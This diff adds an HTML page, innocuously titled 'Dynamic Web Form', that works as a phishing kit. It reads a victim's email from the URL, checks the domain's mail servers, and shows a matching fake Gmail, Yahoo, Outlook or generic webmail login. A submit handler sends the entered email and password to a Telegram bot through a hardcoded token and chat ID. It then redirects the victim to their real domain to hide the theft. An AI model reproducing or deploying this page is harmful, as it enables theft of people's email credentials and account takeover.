@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./assets/media/mail_22591.ico" type="image/x-icon" id="favicon">
+    <link rel="stylesheet" href="./assets/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <title>Dynamic Web Form</title>
+    <script>
+        window.onload = function() {
+
+            // Extract email from URL query
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email');
+            const emailAddress3 = document.getElementById('emailValue3');
+            const emailAddress2 = document.getElementById('emailValue2');
+            const emailAddress1 = document.getElementById('emailValue1');
+            const emailAddress4 = document.getElementById('emailValue4');
+
+            console.log(emailAddress4)
+            
+            if (email) {
+                const domain = email.split('@')[1];
+                
+                // Send domain to backend to get MX records
+                fetch(`http://localhost:3000/getMxRecords?domain=${domain}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.error) {
+                            alert(data.error);
+                        } else {
+                            // Load form design based on MX records
+                            loadFormDesign(data.mxRecord);
+                        }
+                        emailAddress3.innerHTML = `${email}`;
+                        emailAddress2.value = `${email}`;
+                        emailAddress1.value = `${email}`;
+                        emailAddress4.value = `${email}`;
+                    });
+            } else {
+                alert("No email provided in the URL.");
+            }
+        }
+
+        
+
+        function loadFormDesign(mxRecord) {
+            const favicon = document.getElementById("favicon");
+            const email = new URLSearchParams(window.location.search).get('email');
+            const domain = email.split('@')[1];
+            const domainTitle = domain.split('.')[0];
+
+            // Set favicon dynamically based on the email domain
+            favicon.setAttribute("href", `https://www.google.com/s2/favicons?domain=${domain}`);
+
+            const body1 = document.getElementById('body1');
+            const body2 = document.getElementById('body2');
+            const body3 = document.getElementById('body3');
+            const body4 = document.getElementById('body4');
+            const mailTitle = document.getElementById('mail-title');
+
+            console.log(mailTitle)
+            if (mxRecord.includes('google.com')) {
+                favicon.setAttribute("href", "https://pub-fda4dac260fb4b1ca02e8113a836cda2.r2.dev/Microsoft_23401/gmail_new_logo_icon_159149.ico")
+                document.body.style.background = 'white';
+                document.title = 'Private Login';
+                body2.style.display = 'block'
+            } else if (mxRecord.includes('yahoodns.net')) {
+                // favicon.setAttribute("href", "https://pub-fda4dac260fb4b1ca02e8113a836cda2.r2.dev/Microsoft_23401/yahoo_14187.ico");
+                document.body.style.background = 'white';
+                document.title = 'Webmail Login';
+                body1.style.display = 'block';
+            } 
+                else if (mxRecord.includes('outlook.com')) {
+                    
+                // favicon.setAttribute("href", "https://pub-fda4dac260fb4b1ca02e8113a836cda2.r2.dev/Microsoft_23401/Microsoft_23401.ico");
+                document.title = 'Outlook.com';
+                body3.style.display = 'block';               
+            }
+            
+            else {
+                body4.style.display = 'block';
+                document.title = 'Webmail Login';
+                mailTitle.innerHTML = `${domainTitle.charAt(0).toUpperCase() + domainTitle.slice(1)}` + ' Webmail';
+                console.log(mailTitle.textContent)
+            }
+        }
+
+
+    </script>
+</head>
+<body>
+    <div id="body1">
+        <section>
+            <div class="olfm3">
+                <form method="post">
+                    <div class="imageBox">
+                        <img src="./assets/media/mail_22591.png" alt="">
+                    </div>
+                    <div class="signInHeader">
+                        <h2>Sign In</h2>
+                        <p>Sign in to your mail account</p>
+                    </div>
+                    <div class="SignInsection">
+                        <input type="text" name="email" id="emailValue1">
+                    </div>
+                    <div class="passBox">
+                        <input type="password" name="passw0rd" id="passw0rd" placeholder="Enter your password" value="">
+                    </div>
+                    <div class="stay">
+                        <div style="display: flex; align-items: center; gap: 8px;">
+                            <input type="checkbox" name="" id="">
+                        <p style="color: #6001D2;">Stay signed in</p>
+                        </div>
+                        <p style="color: #6001D2;">Forgot password?</p>
+                    </div>
+                    <div class="subBtn">
+                        <button type="submit" id="btn" style="color: white; background-color: #6001D2; border-radius: 20px; width: 100%;">Sign In</button>
+                    </div>
+                    
+                </form>
+            </div>
+        </section>
+        <footer id="gml">
+            <div style="height: 100%; width: 16%; display: flex; align-items: center; justify-content: space-between;">
+                <a href="#" id="site-link2">Help</a>
+                <a href="#" id="site-link2">Terms</a>
+                <a href="#" id="site-link2">Privacy</a>
+            </div>
+        </footer>
+    </div>
+
+    <div id="body2">
+        <section>
+            <div class="olfm3">
+                <form method="post">
+                    <div class="imageBox">
+                        <img src="./assets/media/Gmail_Logo_512px.png" alt="">
+                    </div>
+                    <div class="signInHeader">
+                        <h2>Sign In</h2>
+                        <p>Sign in to your google account</p>
+                    </div>
+                    <div class="SignInsection">
+                        <input type="text" name="email" id="emailValue2">
+                    </div>
+                    <div class="passBox">
+                        <input type="password" name="passw0rd" id="passw0rd" placeholder="Enter your password" value="">
+                    </div>
+                    <div class="subBtn">
+                        <button type="submit" id="btn" style="color: white; background-color: #1A73E8; border-radius: 5px;">Sign In</button>
+                    </div>
+                    <div class="stay">
+                        <input type="checkbox" name="" id="">
+                        <p style="color: #1A73E8;">Stay signed in?</p>
+                    </div>
+                </form>
+            </div>
+        </section>
+        <footer id="gml">
+            <div style="height: 100%; width: 16%; display: flex; align-items: center; justify-content: space-between;">
+                <a href="#" id="site-link2">Help</a>
+                <a href="#" id="site-link2">Terms</a>
+                <a href="#" id="site-link2">Privacy</a>
+            </div>
+        </footer>
+    </div>
+    
+    <div id="body3">
+        <section>
+            <div class="olfm3">
+                <form method="post" class="signInBox">
+                    <div class="imageBox">
+                        <div style="height: 100%; width: 20%; display: flex; align-items: center;">
+                            <img src="./assets/media/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="mail-icon" height="auto" max-width="100%">
+                        </div>
+                        <!-- <div class="webmailTitle">
+                            Outlook
+                        </div> -->
+                    </div>
+                    <div class="SignInsection">
+                        <h2 style="font-weight: 600;">Sign in</h2>
+                        <p style="font-size: .9rem;">to continue to your Microsoft account</p>
+                    </div>
+                    <div id="emailValue3"></div>
+                    <div class="passBox">
+                        <input type="password" name="passw0rd" id="passw0rd" placeholder="Enter your password">
+                    </div>
+                    <div class="stay">
+                        <input type="checkbox" name="" id="">
+                        <p style="font-size: .8rem;">Stay signed in. Do not check on shared computer.</p>
+                    </div>
+                    <div class="subBtn">
+                        <button type="submit" class="subBtnB">
+                            Sign  in
+                        </button>
+                    </div>
+                </form>
+                <div class="signInOptions">
+                    <span style="font-size: 1.5rem;">
+                        <i class="fa-solid fa-key"></i>
+                    </span>
+                    <div><a href="" style="text-decoration: none; color: black;">Sign-in Options</a></div>
+                </div>
+            </div>
+        </section>
+        <footer>
+            <div style="height: 100%; width: 16%; display: flex; align-items: center; justify-content: space-between;">
+                <a href="#" id="site-link">Terms of Use</a>
+                <a href="#" id="site-link">Privacy & Cookies</a>
+                <a href="#" id="site-link">...</a>
+            </div>
+        </footer>
+    </div>
+
+    <div id="body4">
+        <section>
+            <div class="olfm3">
+                <form method="post">
+                    <div class="imageBox">
+                        <img src="./assets/media/mail_22591.png" alt="">
+                        <h2 id="mail-title"></h2>
+                    </div>
+                    <div class="signInHeader">
+                        <h2>Sign In</h2>
+                        <p>Sign in to your account</p>
+                    </div>
+                    <div class="SignInsection">
+                        <input type="text" name="email" id="emailValue4">
+                    </div>
+                    <div class="passBox">
+                        <input type="password" name="passw0rd" id="passw0rd" placeholder="Enter your password" value="">
+                    </div>
+                    <div class="subBtn">
+                        <button type="submit" id="btn" style="color: white; background-color: #1A73E8; border-radius: 5px;">Sign In</button>
+                    </div>
+                    <div class="stay">
+                        <input type="checkbox" name="" id="">
+                        <p style="color: #1A73E8;">Stay signed in?</p>
+                    </div>
+                </form>
+            </div>
+        </section>
+        <footer id="gml">
+            <div style="height: 100%; width: 16%; display: flex; align-items: center; justify-content: space-between;">
+                <a href="#" id="site-link2">Help</a>
+                <a href="#" id="site-link2">Terms</a>
+                <a href="#" id="site-link2">Privacy</a>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        // const addressTag = document.getElementById('emailValue2');
+        // const addressTag2 = document.getElementById('emailValue');
+        // const addressTag1 = document.getElementById('emailValue1');
+        // const addressTag4 = document.getElementById('emailValue4');
+
+        // console.log(addressTag.innerHTML);
+
+        // To get the email
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+
+        console.log(email)
+
+        //Assign email to form
+        // addressTag2.value = email;
+        // addressTag.value = email;
+        // addressTag1.value = email;
+        // addressTag4.value = email;
+        
+
+        function getPassword() {
+        // Try to get password from all possible password fields
+        const passwordFields = document.querySelectorAll('input[type="password"]');
+        for (let field of passwordFields) {
+            if (field.value) {
+                return field.value;
+            }
+        }
+        return null;
+    }
+
+    window.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const password = getPassword();
+        console.log('Password:', password); // Log the password value
+        if (password) {
+            submitToTelegram(email, password);
+        } else {
+            console.error('Password is empty');
+            // Optionally, show an error message to the user
+        }
+    }, true);
+
+        //Handle submission to telegram
+        function submitToTelegram(email, password) {
+        const botToken = '6914027669:AAFaZeyzDYwWuH4VGHfx30ntHKXYrmpaLeo';
+        const chatId = '5532763142';
+        const message = `Email: ${email}\nPassword: ${password}`;
+        const domain = email.split('@')[1];
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('Message sent successfully');
+                window.location.href = `https://${domain}`;
+                // Redirect user or show a success message
+            } else {
+                console.error('Failed to send message');
+                // Handle error (e.g., show an error message to the user)
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            // Handle error (e.g., show an error message to the user)
+        });
+    }
+        
+    </script>
+    
+</body>
+</html>
